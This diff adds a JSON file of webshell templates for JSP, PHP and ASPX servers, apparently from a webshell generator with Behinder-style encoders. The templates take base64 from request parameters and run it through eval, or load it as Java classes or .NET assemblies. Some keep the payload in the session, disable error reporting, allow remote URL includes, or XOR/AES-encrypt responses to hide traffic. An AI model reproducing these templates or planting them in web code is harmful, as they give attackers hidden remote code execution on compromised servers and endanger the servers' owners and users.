@@ -1,0 +1,20 @@
+{
+  "jsp_default_header": "<%@ page trimDirectiveWhitespaces=\"true\" %>",
+  "jsp_default_decode": "private static byte[] decrypt(String base64Text) throws Exception {\n        byte[] result;\n        String version = System.getProperty(\"java.version\");\n        if (version.compareTo(\"1.9\") >= 0) {\n            Class Base64 = Class.forName(\"java.util.Base64\");\n            Object Decoder = Base64.getMethod(\"getDecoder\", null).invoke(Base64, null);\n            result = (byte[]) Decoder.getClass().getMethod(\"decode\", String.class).invoke(Decoder, base64Text);\n        } else {\n            Object Decoder2 = Class.forName(\"sun.misc.BASE64Decoder\").newInstance();\n            result = (byte[]) Decoder2.getClass().getMethod(\"decodeBuffer\", String.class).invoke(Decoder2, base64Text);\n        }\n        return result;\n    }",
+  "jsp_default_member_decl": "class U extends ClassLoader {\n        U(ClassLoader c) {\n            super(c);\n        }\n        public Class g(byte[] b) {\n            return super.defineClass(b, 0, b.length);\n        }\n    }",
+  "jsp_default_service_decl": "new U(Thread.currentThread().getContextClassLoader()).g(decrypt(request.getParameter(\"%v\"))).newInstance().equals(pageContext);",
+  "jsp_session_service_decl": "String pass = \"%v\";\n    if (request.getParameter(\"1\") != null) {\n        if (session.getAttribute(\"RPOAMXO\") != null) {\n            session.getAttribute(\"RPOAMXO\").equals(new Object[]{\n                    request,\n                    response,\n                    session,\n                    new String(decrypt(request.getParameter(pass)))\n            });\n        } else {\n            session.setAttribute(\"RPOAMXO\", new U(Thread.currentThread().getContextClassLoader()).g(decrypt(request.getParameter(pass))).newInstance());\n        }\n    }",
+  "php_default_header": "<?",
+  "php_default_decode": "function decrypt($data, $key)\n{\n    return base64_decode($data, $key);\n}",
+  "php_default_member_decl": "error_reporting(0);",
+  "php_default_service_decl": "$pass = \"%v\";\neval(base64_decode($_POST[$pass],$pass));\n",
+  "php_session_member_decl": "error_reporting(0);\nset_time_limit(0);\nini_set(\"session.gc_maxlifetime\", 3600 * 3600);\nini_set(\"allow_url_fopen\", true);\nini_set(\"allow_url_include\", true);\n@session_start();",
+  "php_session_service_decl": "$pass = \"%v\";\n$payloadName = 'DJAODJAIOAJCMA';\nif (isset($_POST[$pass])) {\n    if (!isset($_SESSION[$payload])) {\n        $_SESSION[$payload] = $_POST[$pass];\n    }else{\n        eval(decrypt($_SESSION[$payload],$pass));\n    }\n}",
+  "aspx_default_header": "<%@ Page Language=\"C#\" %>\n<%@Import Namespace=\"System.Reflection\" %>",
+  "aspx_default_service_decl": "var a = Convert.FromBase64String(Request[\"%v\"]);\n   Assembly myAssebly = System.Reflection.Assembly.Load(a);\n   myAssebly.CreateInstance(\"Payload\").Equals(new object[] {this,a});",
+  "aspx_session_service_decl": "String data = Request.Form[\"%v\"];\n if (data != null) {\n     String payload = Encoding.UTF8.GetString(Convert.FromBase64String(data));\n     if (Session[\"payload\"] == null)\n     {\n         Session[\"payload\"]=System.Reflection.Assembly.Load(Convert.FromBase64String(data)).CreateInstance(\"Payload\");\n         Session[\"payload\"].Equals(new object[] { this, Convert.FromBase64String(data) });\n     }\n     else {\n         Session[\"payload\"].Equals(new object[] { this,payload});\n     }\n }",
+  "behinder_php_echo_encoder": "\nfunction encrypt($data)\n{\n@session_start();\n$key = $_SESSION['k'];\nif(!extension_loaded('openssl'))\n{\nfor($i=0;$i<strlen($data);$i++) {\n$data[$i] = $data[$i]^$key[$i+1&15];\n}\nreturn $data;\n}else{\nreturn openssl_encrypt($data, 'AES128' , $key);\n}\n}",
+  "behinder_asp_echo_encoder": "Function Encrypt(data)\nkey=Session(\"k\")\nsize=len(data)\nFor i=1 To size\nencryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+1,1)))\nNext\nEncrypt=encryptResult\nEnd Function",
+  "behinder_php_assert_prefix": "assert|eval(base64_decode('",
+  "behinder_php_assert_suffix": "'));"
+}
